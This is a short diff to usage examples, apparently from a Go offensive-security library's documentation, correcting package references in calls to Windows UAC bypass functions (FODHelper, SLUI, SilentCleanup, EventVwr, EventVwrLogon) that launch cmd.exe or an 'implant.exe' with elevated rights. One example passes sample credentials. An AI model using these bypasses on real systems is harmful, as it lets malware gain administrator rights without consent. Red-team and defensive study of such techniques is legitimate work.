@@ -65,7 +65,7 @@ import (
 )
 
 func main() {
-    err := privesc/uac.FODHelper(`C:\Windows\System32\cmd.exe`)
+    err := uac.FODHelper(`C:\Windows\System32\cmd.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -103,7 +103,7 @@ import (
 )
 
 func main() {
-    err := privesc/uac.SLUI(`C:\implant.exe`)
+    err := uac.SLUI(`C:\implant.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -143,7 +143,7 @@ import (
 )
 
 func main() {
-    err := privesc/uac.SilentCleanup(`C:\implant.exe`)
+    err := uac.SilentCleanup(`C:\implant.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -181,7 +181,7 @@ import (
 )
 
 func main() {
-    err := privesc/uac.EventVwr(`C:\implant.exe`)
+    err := uac.EventVwr(`C:\implant.exe`)
     if err != nil {
         log.Fatal(err)
     }
@@ -218,7 +218,7 @@ import (
 )
 
 func main() {
-    err := privesc/uac.EventVwrLogon(
+    err := uac.EventVwrLogon(
         "CORP",
         "localadmin",
         "P@ssw0rd!",
